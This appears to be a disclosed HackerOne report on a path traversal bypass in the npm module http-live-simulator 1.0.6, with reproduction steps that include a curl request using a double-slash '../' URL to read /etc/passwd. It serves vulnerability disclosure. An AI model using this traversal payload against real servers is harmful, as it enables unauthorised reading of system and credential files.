@@ -1,0 +1,37 @@
+ReportLink:https://hackerone.com/reports/411405
+WeaknessName:Path Traversal
+Reporter:https://hackerone.com/3la2kb
+ReportedTo:Node.js third-party modules(nodejs-ecosystem)
+BountyAmount:
+Severity:high
+State:Closed
+DateOfDisclosure:28.12.2018 10:07:41
+
+Summary:
+vulnerable_versions: <=1.0.6
+patched_versions: >=1.0.7
+## Module
+
+**module name:** http-live-simulator
+**version:** 1.0.6
+**npm page:** https://www.npmjs.com/package/http-live-simulator
+## Description
+this vulnerability is a bypass for the one found in this [report](https://hackerone.com/reports/384939) in version `1.0.5`
+
+## Steps To Reproduce:
+
+1-  Install the module : `npm install -g http-live-simulator`
+2-  Run the server : `http-live`
+3-  Attempt to access a file from outside that project's directory, such as `curl --path-as-is http://localhost:8080//../../../../etc/passwd`
+
+## The bypass
+
+adding an extra `/` after the URL like :
+
+`http://localhost:8080//../../../../etc/passwd`
+
+mention the double slashes after the port number
+
+## Impact
+
+path traversal vulnerability leading to read access in arbitrary files on disk
